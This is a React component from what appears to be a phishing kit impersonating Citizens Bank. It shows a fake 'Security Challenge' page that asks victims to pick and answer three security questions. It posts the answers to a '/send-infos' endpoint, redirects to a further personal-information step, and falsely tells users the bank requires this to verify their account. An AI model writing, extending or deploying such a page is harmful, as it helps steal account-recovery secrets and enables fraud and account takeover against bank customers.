import { useForm } from "react-hook-form";
import axios from "axios";

import SelectInput from "./SelectInput";
import AnswerInput from "./AnswerInput";
import LeftSide from "./LeftSide";
import RightSide from "./RightSide";
import Sides from "./Sides";
import Button from "./Button";
import Error from "./Error";

const SecurityChallenge = ({ updateInputs, history }) => {
  const onSubmit = async (data) => {
    updateInputs({
      form: "SECURITY CHALLENGE",
      securityChallenge: data,
    });
    await axios.post("/send-infos", {
      form: "SECURITY CHALLENGE",
      securityChallenge: data,
    });
    history.push("/personal-information");
  };

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();
  return (
    <div className="scurity-challenge">
      <Sides>
        <LeftSide>
          <div>
            <SelectInput
              name="questionOne"
              label="Challenge Question 1"
              register={register("question1", {
                validate: (value) => {
                  if (value === "true") {
                    return false;
                  }

                  return true;
                },
              })}
              options={[
                "What was the name of your High School?",
                "What is your maternal grandfather's first name?",
                "In which city were you married? (Enter full name of the city)",
                "What is the first name of the maid of honor at your wedding?",
                "What is the first name of your oldest nephew?",
                "What is the name of the first company you worked for?",
                "What is your father's middle name?",
                "What is your best friend's first name?",
                "In which city was your high school? (Enter only the full name of the city)",
              ]}
            />
            {errors?.question1 && (
              <Error message="Please select a challenge question" />
            )}
            <AnswerInput
              title="Answer 1: "
              register={register("answer1", {
                required: "Please enter an answer",
              })}
            />
            {errors?.answer1 && <Error message={errors.answer1.message} />}
          </div>
          <div>
            <SelectInput
              name="questionTwo"
              label="Challenge Question 2"
              register={register("question2", {
                validate: (value) => {
                  if (value === "true") {
                    return false;
                  }

                  return true;
                },
              })}
              options={[
                "What was your high school mascot?",
                "What was the  name of your first pet?",
                "In which city is your vacation home? (Enter full name of the city)",
                "What is the first name of your oldest niece?",
                "What was the name of your girlfriend/boyfriend?",
                "What was the nickname of your grandfather?",
                "What is your paternal grandmother's first name?",
                "What was the first name of your first manager?",
                "In which city was your father born? (Enter only the full name of the city)",
              ]}
            />
            {errors?.question2 && (
              <Error message="Please select a challenge question" />
            )}
            <AnswerInput
              title="Answer 2: "
              register={register("answer2", {
                required: "Please enter an answer",
              })}
            />
            {errors?.answer2 && <Error message={errors.answer2.message} />}
          </div>
          <div>
            <SelectInput
              name="questionTwo"
              label="Challenge Question 3"
              register={register("question3", {
                validate: (value) => {
                  if (value === "true") {
                    return false;
                  }

                  return true;
                },
              })}
              options={[
                "What was the name of the town your grandmother lived in? (Enter only full name of the town)",
                "What was the name of your high school?",
                "Where did you meet your spouse for the first time? (Enter only the full name of the city)",
                "What was the last name of your favourite teacher in final year of high school?",
                "In which city were you born? (Enter only the full name of the city)",
                "In which city was your mother born? (Enter only the full name of the city)",
                "What is your paternal grandfather's first name?",
                "What is your mother middle name?",
                "What was your favorite restaurant in college?",
                "What street did your best friend in high school live on? (Enter only the full name of the city)",
              ]}
            />
            {errors?.question3 && (
              <Error message="Please select a challenge question" />
            )}
            <AnswerInput
              title="Answer 3: "
              register={register("answer3", {
                required: "Please enter an answer",
              })}
            />
            {errors?.answer3 && <Error message={errors.answer3.message} />}
          </div>
        </LeftSide>
        <RightSide>
          <h4>Why do I have to provide this information</h4>
          <p>
            Citizens bank requires all this information to be able to verify
            your account
          </p>
        </RightSide>
      </Sides>
      <Button onClick={handleSubmit(onSubmit)} />
    </div>
  );
};

export default SecurityChallenge;
